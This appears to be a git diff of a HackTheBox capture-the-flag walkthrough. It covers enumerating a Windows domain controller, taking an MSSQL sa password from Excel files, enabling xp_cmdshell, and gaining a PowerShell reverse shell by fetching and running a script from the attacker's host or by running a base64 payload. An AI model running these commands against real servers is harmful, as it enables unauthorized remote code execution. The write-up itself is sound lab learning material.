@@ -13,6 +13,7 @@ Interesting for this one. I don't usually see this on HTB. But we are given cred
 - username: `rose`
 - password: `KxEPkKe6R8su`
 
+## Enumeration
 
 When scanning Windows machines we need the `-Pn` flag due to Windows not responding to ping from nmap. 
 
@@ -56,6 +57,8 @@ This could be interesting... An exposed MSSQL server?
 
 So... given that we started with creds. Lets just try enumerating the `SMB` shares first?
 
+### SMB
+
     smbclient -U rose -L //DC01.sequel.htb/
     Password for [WORKGROUP\rose]: <enter password>
 
@@ -88,6 +91,8 @@ Lets look at `Accounting Department`.
     Password for [WORKGROUP\rose]: <enter password> 
 
 If we look in `Accounting Department`, we can see two interesting microsoft excel files. 
+
+### Corrupted Excel Documents
 
     smb: \> ls
     .                                   D        0  Sun Jun  9 05:52:21 2024
@@ -129,13 +134,101 @@ It looks like one of the usernames is `sa@sequel.htb` with the password `MSSQL..
 The password is a pretty heavy handed hint that our next location of interest is the open MSSQL server
 that we spied earlier.
 
+### MSSQL
+
 Using the client that comes with MSSQL, we can connect to and query the database as the admin 
 
     sqlcmd -C -S dc01.sequel.htb -U sa -P MSSQL...
 
 We need to use `-C` to disable certificate checking (it's self signed) 
 
-    1> select name from sys.databases;
+    1> select name from sys.databases
     2> go
 
-Looking at the tables we can only see the default ones.
+Looking at the tables we can only see the default ones. 
+
+It doesn't seem like there's anything interesing in the database. 
+
+However, this server is still insanely useful to us with our account. 
+
+## Code Execution
+
+One thing we can check for is `xp_cmdshell`. It's an optional feature for `MSSQL` 
+server that allows the user to execute a cmd program. 
+
+Let's check the configuration value. We need to enable advanced options first.
+
+    1> exec sp_configure 'show advanced options', 1
+    2> go
+    1> reconfigure
+    2> go
+    1> exec sp_configure xp_cmdshell
+    2> go
+
+Looks like it's disabled. 
+
+    name                                minimum     maximum     config_value run_value
+    ----------------------------------- ----------- ----------- ------------ -----------
+    xp_cmdshell                                   0           1            0           0
+
+It looks like we have a database admin account though, so let's 
+attempt to enable it. 
+
+    1> exec sp_configure xp_cmdshell, 1
+    2> go
+    1> reconfigure
+    2> go
+
+And now we should have code execution! 
+
+    1> exec xp_cmdshell 'powershell -command whoami'
+    2> go
+
+Nice. `Powershell` is there as expected.
+
+    sequel\sql_svc
+
+The easiest way to proceed going forward is with a reverse shell. You can find one for
+`powershell` pretty easily online. I used [this one](https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1) and changed the host and port to point
+to my machine's listener. 
+
+There are two ways to do this (that I know of). Let's go over both.
+
+## Reverse Shell 
+
+First thing we should do for both of our methods is set up our listener in a seperate session.
+
+    nc -lvnp 42069
+
+Our first method involves using an `HTTP` server to host the powershell script and invoking
+it with `webclient.downloadstring` 
+
+In a seperate session, host an `HTTP` server for the folder containing your reverse shell 
+(here is an example with `python`). 
+
+    python -m http.server 58008 -d ./shell_folder 
+
+And in the `MSSQL` session invoke the web request like so.
+
+    1> exec xp_cmdshell 'powershell -c "iex (new-object net.webclient).downloadstring(\"http://10.10.14.xxx:58008/shell.ps1\")"'
+    2> go 
+
+You'll see it make a request to your web server, then you'll see a connection from netcat. 
+
+    Listening on 0.0.0.0 42069
+    Connection received on 10.10.11.51 50293
+    <hit enter>
+    PS C:\Windows\system32> 
+
+Or... If you don't want to set up a web server, you can base64 encode the payload and pipe 
+it directly into the `xp_cmdshell`. 
+
+Just ensure you're encoding with the correct format for Windows. Windows uses UTF-16LE. To
+convert from UTF-8 (linux) you can encode like this.
+
+    cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0 
+
+Take the output from that and paste it into the `MSSQL` client prompt. 
+
+    1> exec xp_cmdshell 'powershell -e <base64>'
+    2> go
